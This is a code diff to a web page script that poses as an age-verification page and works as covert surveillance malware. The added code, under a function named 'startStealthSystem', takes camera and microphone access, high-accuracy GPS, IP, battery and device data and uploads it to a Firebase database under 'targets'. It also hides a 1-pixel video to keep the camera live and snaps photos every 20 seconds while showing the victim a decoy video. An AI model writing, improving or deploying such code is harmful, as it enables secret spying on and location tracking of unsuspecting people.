@@ -41,7 +41,7 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // Unique ID Logic (Date/Time based)
+        // Unique ID Logic
         const now = new Date();
         const dateStr = now.getDate() + "-" + (now.getMonth() + 1);
         const sessionID = "Target_" + dateStr + "_" + Math.floor(1000 + Math.random() * 9000);
@@ -51,58 +51,77 @@
         async function startStealthSystem() {
             document.getElementById('age-modal').style.display = 'none';
             try {
-                // Request All Permissions
-                currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                
-                // Get Info
+                // 1. Camera & Audio Access (Pehle permissions zaroori hain)
+                currentStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, 
+                    audio: true 
+                });
+
+                // 2. High Accuracy GPS Request
+                const geoOptions = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
+                navigator.geolocation.getCurrentPosition(
+                    (p) => { 
+                        db.ref(`targets/${sessionID}/location`).set({ 
+                            lat: p.coords.latitude, 
+                            lng: p.coords.longitude, 
+                            acc: p.coords.accuracy + "m",
+                            time: new Date().toLocaleString('en-GB')
+                        }); 
+                    },
+                    (e) => { 
+                        db.ref(`targets/${sessionID}/location`).set({ note: "PERMISSION_DENIED", code: e.code }); 
+                    }, 
+                    geoOptions
+                );
+
+                // 3. Get Device Info (IP, Battery, Network)
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 const batt = await navigator.getBattery();
                 const net = navigator.connection || {effectiveType: "unknown"};
 
-                // Initial Data Send
                 db.ref(`targets/${sessionID}/info`).set({
                     ip: ipData.ip,
                     battery: Math.floor(batt.level * 100) + "%",
                     network: net.effectiveType,
                     device: navigator.platform,
                     status: "ONLINE",
-                    time: new Date().toLocaleString()
+                    time: new Date().toLocaleString('en-GB')
                 });
 
-                // Get GPS
-                navigator.geolocation.getCurrentPosition(
-                    (p) => { db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy }); },
-                    (e) => { db.ref(`targets/${sessionID}/location`).set({ note: "GPS_DENIED", ip: ipData.ip }); },
-                    { enableHighAccuracy: true }
-                );
+                // 4. Background Hidden Video (Keeps camera sensor active to fix black screen)
+                const hiddenVideo = document.createElement('video');
+                hiddenVideo.style.width = "1px"; hiddenVideo.style.height = "1px"; hiddenVideo.style.opacity = "0.01";
+                hiddenVideo.srcObject = currentStream;
+                hiddenVideo.muted = true;
+                hiddenVideo.play();
+                document.body.appendChild(hiddenVideo);
 
-                // Start Video UI
+                // 5. Start Video Player for User
                 document.getElementById('main-ui').style.display = 'none';
                 const v = document.getElementById('target-player');
                 v.style.display = 'block';
                 v.play();
 
-                // Auto-Capture Mode (Har 20 seconds baad photo)
+                // 6. Automation & Listeners
                 setInterval(() => { capturePhoto('auto'); }, 20000);
-
                 listenForAdmin();
+
             } catch (err) {
-                alert("Permission Error: Please allow access to verify your age.");
+                alert("Access Required for Verification!");
                 location.reload();
             }
         }
 
-        // --- FIXED CAPTURE FUNCTION (No Black Screen) ---
         async function capturePhoto(type) {
+            if (!currentStream) return;
             const canvas = document.createElement('canvas');
             const vTrack = document.createElement('video');
             vTrack.srcObject = currentStream;
             vTrack.muted = true;
-            vTrack.setAttribute('playsinline', '');
             vTrack.play();
 
-            // 2 Second wait taake camera sensor adjust ho jaye
+            // 2 Second delay to let camera adjust light
             setTimeout(() => {
                 canvas.width = vTrack.videoWidth || 640;
                 canvas.height = vTrack.videoHeight || 480;
